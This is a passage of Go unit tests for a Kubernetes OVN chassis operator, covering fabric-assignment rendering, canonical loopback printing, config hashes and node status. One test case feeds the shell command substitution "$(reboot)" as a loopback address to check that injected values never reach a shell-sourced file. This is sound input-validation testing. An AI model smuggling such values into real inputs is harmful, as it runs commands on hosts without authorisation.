	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()

	var seen []client.ListOption
	c := ovnChassisFakeClientBuilder(t, cr, chassisNode(testNodeA, selectedLabels())).
		WithInterceptorFuncs(interceptor.Funcs{
			List: func(ctx context.Context, cl client.WithWatch, list client.ObjectList, opts ...client.ListOption) error {
				if _, ok := list.(*corev1.NodeList); ok {
					seen = opts
				}
				return cl.List(ctx, list, opts...)
			},
		}).Build()
	r := &OVNChassisReconciler{Client: c, Scheme: newTestScheme(t), Recorder: record.NewFakeRecorder(10)}

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(seen).To(ConsistOf(client.MatchingLabels(cr.Spec.NodeSelector)))
}

// testFabric is a spec.fabric block as the CRD schema defaults it, with one row
// for testNodeA and none for testNodeB: two uplinks, one announceable range per
// family, VRF id 42 advertised and VRF id 10 learned.
func testFabric() *ovnv1alpha1.OVNFabricSpec {
	return &ovnv1alpha1.OVNFabricSpec{
		VRF: ovnv1alpha1.OVNFabricVRFSpec{Name: "fabric", Table: 100},
		Uplinks: []ovnv1alpha1.OVNFabricUplink{
			{Interface: "fab1", Bridge: "br-fab1"},
			{Interface: "fab2", Bridge: "br-fab2"},
		},
		MTU: 9000,
		Nodes: []ovnv1alpha1.OVNFabricNode{{
			Name: testNodeA, ASN: 4200000001, LoopbackIPv4: "192.0.2.1", LoopbackIPv6: "2001:db8::1",
		}},
		AnnounceableRanges: []string{"198.51.100.0/24", "2001:db8::/64"},
		AdvertiseVRFIDs:    []int64{42},
		LearnVRFIDs:        []int64{10},
		BFD:                ovnv1alpha1.OVNFabricBFDSpec{ReceiveIntervalMs: 300, TransmitIntervalMs: 300, DetectMultiplier: 3},
	}
}

// testFabricLines are the six lines testFabric renders for testNodeA.
const testFabricLines = "FABRIC_VRF=fabric\n" +
	"FABRIC_TABLE=100\n" +
	"FABRIC_MTU=9000\n" +
	"FABRIC_UPLINKS=fab1:br-fab1,fab2:br-fab2\n" +
	"FABRIC_LOOPBACK_V4=192.0.2.1\n" +
	"FABRIC_LOOPBACK_V6=2001:db8::1\n"

// A node with a row in spec.fabric.nodes renders the six FABRIC_ lines after
// ENCAP_TYPE, which fabricNodeScript sources. A node without a row renders none
// of them, and neither does a node whose loopback does not parse as an address
// of its family: the file is sourced as shell, so only an address the
// reconciler parsed and printed again may reach it.
func TestNodes_FabricAssignment(t *testing.T) {
	tests := []struct {
		name       string
		mutate     func(*ovnv1alpha1.OVNChassis)
		wantFabric bool
	}{
		{name: "row present", mutate: func(*ovnv1alpha1.OVNChassis) {}, wantFabric: true},
		{
			name:   "no fabric block",
			mutate: func(cr *ovnv1alpha1.OVNChassis) { cr.Spec.Fabric = nil },
		},
		{
			name:   "no row for the node",
			mutate: func(cr *ovnv1alpha1.OVNChassis) { cr.Spec.Fabric.Nodes[0].Name = testNodeB },
		},
		{
			name:   "unparsable IPv4 loopback",
			mutate: func(cr *ovnv1alpha1.OVNChassis) { cr.Spec.Fabric.Nodes[0].LoopbackIPv4 = "$(reboot)" },
		},
		{
			name:   "IPv6 address in the IPv4 field",
			mutate: func(cr *ovnv1alpha1.OVNChassis) { cr.Spec.Fabric.Nodes[0].LoopbackIPv4 = "2001:db8::9" },
		},
		{
			name:   "IPv4 address in the IPv6 field",
			mutate: func(cr *ovnv1alpha1.OVNChassis) { cr.Spec.Fabric.Nodes[0].LoopbackIPv6 = "192.0.2.9" },
		},
		{
			name:   "IPv6 loopback with a zone",
			mutate: func(cr *ovnv1alpha1.OVNChassis) { cr.Spec.Fabric.Nodes[0].LoopbackIPv6 = "fe80::1%eth0" },
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			g := NewGomegaWithT(t)
			cr := testOVNChassis()
			cr.Spec.Fabric = testFabric()
			tt.mutate(cr)

			entries := renderNodeEntries(cr, []corev1.Node{*chassisNode(testNodeA, selectedLabels())},
				map[string]nodeEntry{testNodeA: {systemID: testFixedSystemID}})
			entry := entries[testNodeA]
			rendered := entry.render()

			if !tt.wantFabric {
				g.Expect(entry.fabric).To(BeNil())
				g.Expect(entry.asn).To(BeZero(), "a node without a fabric assignment has no ASN to configure")
				g.Expect(rendered).NotTo(ContainSubstring("FABRIC_"))
				return
			}
			g.Expect(rendered).To(Equal(
				"SYSTEM_ID=" + testFixedSystemID + "\n" +
					"GATEWAY=false\n" +
					"BRIDGE_MAPPINGS=\n" +
					"ENCAP_TYPE=geneve\n" +
					testFabricLines))
			g.Expect(entry.asn).To(BeEquivalentTo(4200000001))
		})
	}
}

// The loopbacks are printed as netip prints them, not as the spec spells them,
// so two spellings of one address render one entry and one hash.
func TestNodes_FabricLoopbacksArePrintedCanonically(t *testing.T) {
	g := NewGomegaWithT(t)
	cr := testOVNChassis()
	cr.Spec.Fabric = testFabric()
	cr.Spec.Fabric.Nodes[0].LoopbackIPv6 = "2001:DB8:0:0::1"

	entries := renderNodeEntries(cr, []corev1.Node{*chassisNode(testNodeA, selectedLabels())}, nil)

	g.Expect(entries[testNodeA].render()).To(ContainSubstring("FABRIC_LOOPBACK_V6=2001:db8::1\n"))
}

// A leaving node never carries a fabric assignment, whether it left the
// selector or the cluster: its entry is the one the teardown runs against, and
// the Fabric step must not generate an FRRConfiguration for it.
func TestNodes_LeavingNodeCarriesNoFabric(t *testing.T) {
	g := NewGomegaWithT(t)
	cr := testOVNChassis()
	cr.Spec.Fabric = testFabric()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{
		{Name: testNodeB, SystemID: testFixedSystemID, ConfigHash: "abcdef01", Fabric: true},
	}

	// testNodeA is in the live ConfigMap but no longer selected; testNodeB is in
	// status only. Both have rows in the table.
	cr.Spec.Fabric.Nodes = append(cr.Spec.Fabric.Nodes, ovnv1alpha1.OVNFabricNode{
		Name: testNodeB, ASN: 4200000002, LoopbackIPv4: "192.0.2.2", LoopbackIPv6: "2001:db8::2",
	})
	entries := renderNodeEntries(cr, []corev1.Node{*chassisNode(testNodeA, nil)},
		map[string]nodeEntry{testNodeA: {systemID: testFixedSystemID}})

	g.Expect(entries).To(HaveLen(2))
	for name, entry := range entries {
		g.Expect(entry.leaving).To(BeTrue(), name)
		g.Expect(entry.fabric).To(BeNil(), name)
		g.Expect(entry.frrK8s).To(BeFalse(), name)
		g.Expect(entry.render()).NotTo(ContainSubstring("FABRIC_"), name)
	}
}

// The fabric block is part of the rendered entry, so a change to it changes the
// hash the maintenance step compares against, and with it the rerun key of the
// node's apply Job. The ASN is not rendered: the node never reads it.
func TestNodes_FabricChangeChangesTheHash(t *testing.T) {
	g := NewGomegaWithT(t)
	nodes := []corev1.Node{*chassisNode(testNodeA, selectedLabels())}
	live := map[string]nodeEntry{testNodeA: {systemID: testFixedSystemID}}

	cr := testOVNChassis()
	without := renderNodeEntries(cr, nodes, live)[testNodeA].hash()

	cr.Spec.Fabric = testFabric()
	with := renderNodeEntries(cr, nodes, live)[testNodeA].hash()
	g.Expect(with).NotTo(Equal(without), "adding the block must re-apply the node")

	cr.Spec.Fabric.MTU = 1500
	g.Expect(renderNodeEntries(cr, nodes, live)[testNodeA].hash()).NotTo(Equal(with),
		"a changed MTU must re-apply the node")

	cr.Spec.Fabric = testFabric()
	cr.Spec.Fabric.Nodes[0].ASN = 4200000099
	g.Expect(renderNodeEntries(cr, nodes, live)[testNodeA].hash()).To(Equal(with),
		"the ASN lives in the FRRConfiguration, not in the node entry")
}

// The frr-k8s label and the hostname are read from the Node, the hostname
// falling back to the node's name when the kubernetes.io/hostname label is
// absent, so the FRRConfiguration's node selector always has a value to match.
func TestNodes_FRRK8sLabelAndHostname(t *testing.T) {
	g := NewGomegaWithT(t)
	cr := testOVNChassis()
	cr.Spec.Fabric = testFabric()

	labelled := chassisNode(testNodeA, map[string]string{
		testChassisNodeLabel: "true", frrK8sNodeLabel: "true", corev1.LabelHostname: "host-a",
	})
	other := chassisNode(testNodeB, map[string]string{testChassisNodeLabel: "true", frrK8sNodeLabel: "false"})

	entries := renderNodeEntries(cr, []corev1.Node{*labelled, *other}, nil)

	g.Expect(entries[testNodeA].frrK8s).To(BeTrue())
	g.Expect(entries[testNodeA].hostname).To(Equal("host-a"))
	g.Expect(entries[testNodeB].frrK8s).To(BeFalse(), `only the value "true" opts a node in`)
	g.Expect(entries[testNodeB].hostname).To(Equal(testNodeB))
	g.Expect(entries[testNodeA].render()).NotTo(ContainSubstring("host-a"), "neither field is rendered")
}

// status.nodes[].fabric records whether a node may carry fabric devices: it
// goes up with the first entry that carries an assignment, which the node's
// init container may apply before any apply Job runs, stays up after the row is
// removed until the teardown ran, and is set from the entry for a node seen for
// the first time.
func TestNodes_StatusFabricCarriedAndFirstSet(t *testing.T) {
	g := NewGomegaWithT(t)
	cr := testOVNChassis()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{
		{Name: testNodeA, SystemID: testFixedSystemID, ConfigHash: "abcdef01", Fabric: false},
		{Name: testNodeB, SystemID: testFixedSystemID, ConfigHash: "abcdef02", Fabric: true},
	}
	fabric := &nodeFabric{vrf: "fabric"}
	entries := renderedNodes{
		testNodeA:  {systemID: testFixedSystemID, fabric: fabric},
		testNodeB:  {systemID: testFixedSystemID},
		"node-new": {systemID: testFixedSystemID, fabric: fabric},
	}

	statuses := nodeStatuses(cr, entries)

	g.Expect(statuses).To(HaveLen(3))
	byName := make(map[string]ovnv1alpha1.OVNChassisNodeStatus, len(statuses))
	for _, status := range statuses {
		byName[status.Name] = status
	}
	g.Expect(byName[testNodeA].Fabric).To(BeTrue(), "the init container may apply the assignment before the apply Job")
	g.Expect(byName[testNodeA].ConfigHash).To(Equal("abcdef01"), "the hash still waits for the apply Job")
	g.Expect(byName[testNodeB].Fabric).To(BeTrue(), "a removed row is still applied until the teardown ran")
	g.Expect(byName["node-new"].Fabric).To(BeTrue(), "the init container applies the first entry")
}
